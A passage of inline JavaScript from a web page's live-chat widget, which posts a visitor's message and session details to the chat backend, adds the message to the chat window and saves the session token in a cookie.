xhttp.send("send=1&track_id=" + encodeURIComponent(track_id) + "&uid=" + encodeURIComponent(uid) + "&token=" + encodeURIComponent(token) + "&message=" + encodeURIComponent(message) + "&type=" + encodeURIComponent(window.location.host.split('.')[0]) + "&title=" + encodeURIComponent(title));
cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
$('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + '<div class="visitors-msg-text" id="qwe1649370526">'+ message +'</div>');
setCookie('token', token);
var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
}

function setCookie(cname, cvalue) {
var d = new Date();
d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
var expires = "expires=" + d.toUTCString();
document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

</script>
</div></body></html>